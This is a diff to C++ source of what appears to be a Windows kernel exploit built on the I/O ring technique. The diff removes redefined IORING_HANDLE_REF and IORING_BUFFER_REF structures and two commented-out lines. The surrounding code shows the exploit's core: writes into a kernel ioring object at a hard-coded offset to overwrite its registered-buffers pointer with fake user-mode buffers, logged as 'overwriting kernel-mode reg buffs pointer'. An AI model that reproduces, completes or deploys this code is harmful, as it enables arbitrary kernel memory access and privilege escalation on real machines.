@@ -12,55 +12,6 @@
 
 #include "kernel.h"
 
-
-
-typedef struct aIORING_HANDLE_REF
-{
-	/*#ifdef __cplusplus
-		explicit IORING_HANDLE_REF(HANDLE h)
-			: Kind(IORING_REF_KIND::IORING_REF_RAW)
-			, Handle(h)
-		{}
-
-		explicit IORING_HANDLE_REF(UINT32 index)
-			: Kind(IORING_REF_KIND::IORING_REF_REGISTERED)
-			, Handle(index)
-		{}
-	#endif*/
-
-	IORING_REF_KIND Kind;
-	union HandleUnion
-	{
-		/*#ifdef __cplusplus
-				HandleUnion(HANDLE h)
-					: Handle(h)
-				{}
-
-				HandleUnion(UINT32 index)
-					: Index(index)
-				{}
-		#endif*/
-		// Handle to the file object if Kind == IORING_REF_RAW
-		HANDLE Handle;
-
-		// Index of registered file handle if Kind == IORING_REF_REGISTERED
-		UINT32 Index;
-	} Handle;
-} aIORING_HANDLE_REF;
-
-typedef struct aIORING_BUFFER_REF
-{
-
-	IORING_REF_KIND Kind;
-	union BufferUnion
-	{
-		// Address of the buffer if Kind == IORING_REF_RAW
-		void* Address;
-
-		// Registered buffer details if Kind == IORING_REF_REGISTERED
-		IORING_REGISTERED_BUFFER IndexAndOffset;
-	}Buffer;
-} aIORING_BUFFER_REF;
 // could create an ioring class but i am not really bothered
 namespace collat {
 		ioring::ioring(LPCSTR InputPipeName, LPCSTR OutputPipeName) {
@@ -102,7 +53,6 @@ namespace collat {
 		}
 
 		void ioring::testthread() {
-			//kernel::do_write((uint64_t)_ioring_object + 0x90);//
 			char zeroBuf[0x20];
 			memset(zeroBuf, 0, sizeof(zeroBuf));
 			spdlog::debug("fixing event pointers...");
@@ -118,7 +68,6 @@ namespace collat {
 			}
 
 			_fake_reg_buffers_size = sizeof(uint64_t) * FakeRegBufferCount;
-			//_fake_reg_buffers = (uint64_t*)VirtualAlloc(nullptr, _fake_reg_buffers_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
 			spdlog::debug("overwriting kernel-mode reg buffs pointer...");
 			kernel::do_write((uint64_t)_ioring_object + 0x9d);
